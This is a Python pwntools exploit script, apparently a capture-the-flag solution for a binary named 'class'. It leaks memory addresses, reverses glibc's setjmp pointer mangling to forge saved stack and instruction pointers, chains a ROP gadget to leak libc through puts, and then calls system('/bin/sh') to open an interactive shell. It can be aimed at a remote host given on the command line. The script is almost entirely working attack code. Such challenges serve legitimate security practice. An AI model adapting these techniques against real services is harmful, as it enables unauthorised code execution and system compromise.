#!/usr/bin/env python2
# -*- coding:utf-8 -*-
from pwn import *
import os, sys

# switches
DEBUG = 1

# modify this
elf = ELF('./class')

if DEBUG:
    io = process('./class')
else:
    io = remote(sys.argv[1], int(sys.argv[2]))

if DEBUG: context(log_level='debug')
# define symbols and offsets here

# simplified r/s function
def ru(delim):
    return io.recvuntil(delim)

def rn(count):
    return io.recvn(count)

def ra(count):      # recv all
    buf = ''
    while count:
        tmp = io.recvn(count)
        buf += tmp
        count -= len(tmp)
    return buf

def sl(data):
    return io.sendline(data)

def sn(data):
    return io.send(data)

def info(string):
    return log.info(string)

def dehex(s):
    return s.replace(' ','').decode('hex')

# define interactive functions here

def leak_rsp():
    ru('Please input the number of the student:')
    sl('92233720368547759') #malloc 0xc0
    ru('>>')
    sl('2')
    ru('Input the number:')
    sl('1')
    
    ru('name:')
    r12_addr = u64(ru(',')[:-1].ljust(8, '\x00'))
    info('r12_addr :' + hex(r12_addr))
    ru('addr:')
    enc_rsp = u64(rn(8))
    enc_rip = u64(rn(8))
    info('enc_rip :' + hex(enc_rip))
    info('enc_rsp :' + hex(enc_rsp))

    base = r12_addr - 0xaa0
    info('base :' + hex(base))
    rip_addr = base + 0x1495 #address after call setjmp
    magic_word = ror(enc_rip, 0x11, 64) ^ rip_addr 
    
    info('magic_word :' + hex(magic_word))
    rsp_addr = ror(enc_rsp, 0x11, 64) ^ magic_word
    info('rsp_addr :' + hex(rsp_addr))

    return (base, rsp_addr, magic_word)

def edit(id, age, name, addr, intro):
    ru('>>')
    sl('3')
    ru(':')
    sl(str(id))
    ru(':')
    sl(name)
    ru(':')
    sl(str(age))
    ru(':')
    sl(addr)
    ru(':')
    sl(intro)

# define exploit function here
def pwn():	
    base, rsp, magic_word = leak_rsp()
    fake_rsp = rsp - 0x48  
    info('fake_rsp :' + hex(fake_rsp))
    pop_rdi_ret = base + 0x1523
    info('p_r :' + hex(pop_rdi_ret))
    
    addr = p64(rol(fake_rsp ^ magic_word, 0x11, 64))
    addr += p64(rol(pop_rdi_ret ^ magic_word, 0x11, 64))
    edit(1, 0, '', addr, '')
    ru('>>')

    payload = '5;' + 'a' * 6
    puts_got = 0x202018 + base
    puts_plt = 0x9a0 + base
    main = base + 0x13ff
    payload += p64(puts_got) + p64(puts_plt) + p64(main)
    sl(payload)

    puts_libc = u64(io.recvline()[:-1].ljust(8, '\x00'))
    libc = ELF('./libc-64')
    system = puts_libc - libc.symbols['puts'] + libc.symbols['system']
    binsh = puts_libc - libc.symbols['puts'] + libc.search('/bin/sh\x00').next()

    ru(':')
    sl('92233720368547759')

    fake_rsp = rsp - 0x80
    addr = p64(rol(fake_rsp ^ magic_word, 0x11, 64))
    addr += p64(rol(pop_rdi_ret ^ magic_word, 0x11, 64))

    edit(1, 0, '', addr, '')

    ru('>>')
    payload = '5;' + 'a' * 6
    payload += p64(binsh) + p64(system) + p64(main)
    sl(payload)


    io.interactive()
    return

if __name__ == '__main__':
    
    pause()
    pwn()
    
